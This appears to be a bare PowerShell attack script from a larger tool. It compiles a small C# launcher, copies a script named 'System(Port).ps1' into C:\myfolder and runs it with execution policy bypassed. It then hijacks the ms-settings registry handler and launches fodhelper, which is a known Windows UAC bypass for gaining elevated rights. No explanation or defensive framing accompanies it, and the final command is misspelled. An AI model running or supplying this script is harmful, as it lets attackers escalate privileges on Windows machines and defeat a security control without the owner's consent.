$source = @"
using System.Diagnostics;
class Program {
    static void Main() {
        var psi = new ProcessStartInfo {
            FileName = "powershell.exe",
            Arguments = "-ExecutionPolicy Bypass -File \"C:\\myfolder\\System(Port).ps1\"",
            UseShellExecute = true

        };
        Process.Start(psi);
    }
}
"@
    
$folderPath = "C:\myfolder"


if (-Not (Test-Path $folderPath)) {
    New-Item -Path $folderPath -ItemType Directory | Out-Null
}

Add-Type -TypeDefinition $source -OutputAssembly "C:/myfolder/barney.exe" 
cd assets
Copy-Item ".\System(Port).ps1" -Destination "C:\myfolder"

New-Item -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "(default)" -Value "../../myfolder/barney.exe"
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -PropertyType String -Force | Out-Null
Start-Process fodhelper.exes